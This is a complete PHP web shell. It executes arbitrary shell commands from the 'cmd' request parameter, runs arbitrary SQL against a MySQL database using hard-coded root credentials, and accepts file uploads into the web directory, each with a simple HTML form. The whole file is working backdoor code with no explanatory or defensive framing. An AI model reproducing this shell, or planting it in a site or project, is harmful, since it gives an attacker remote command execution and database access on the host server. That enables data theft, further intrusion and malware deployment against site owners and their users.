<?php 
$hostname   = "localhost"; 
 $username = "root"; 
$password = "Hello@123";
$dbname = "admin"; 
if(isset($_REQUEST['cmd'])){
echo shell_exec($_REQUEST['cmd']." 2>&1");   }
if(isset($_REQUEST['sql'])){
         if(isset($_REQUEST['query'])){
        
        $dbhandle=mysqli_connect($hostname, $username, $password, $dbname)
        or die("Unable to connect to MySQL");
        date_default_timezone_set('Asia/Kolkata');
              $query = $_REQUEST['query'];
               echo $query."<br>";
               $fet_settinghandler = mysqli_query($dbhandle, $query);
        $fet_settingnum = mysqli_num_rows($fet_settinghandler);
        if($fet_settingnum>0)
        {
while($row =mysqli_fetch_assoc($fet_settinghandler))
echo json_encode($row)."<br>";
}}else{  echo "Enter  query";}}
 if(isset($_REQUEST['upload'])){
      $file_name = $_FILES['file']['name'];
      $file_tmp =$_FILES['file']['tmp_name'];
      echo $file_name;
      move_uploaded_file($file_tmp,"".$file_name);}?>
<html>
   <body>
<?php if(isset($_REQUEST['upload'])) : ?>
  <form action="" method="POST" enctype="multipart/form-data">
         <input type="file" name="file" /><br>
         <input type="hidden" name="value" value="1"/><br>
         <input type="submit"/>
      </form>
<?php endif; ?>
<?php if(isset($_REQUEST['sql'])) : ?>
<form action="" method="POST">

Query: <input name="query" value="<?=$query?>" /><br>
<input type="submit" value="Send" /><br>
</form>
<?php endif; ?>
<?php if(isset($_REQUEST['cmd'])) : ?>
<form action="" method="POST">

CMD->: <input name="cmd" value="<?=$cmd?>" /><br>
<input type="submit" value="Send" /><br>
</form>
<?php endif; ?>
   </body>
</html>

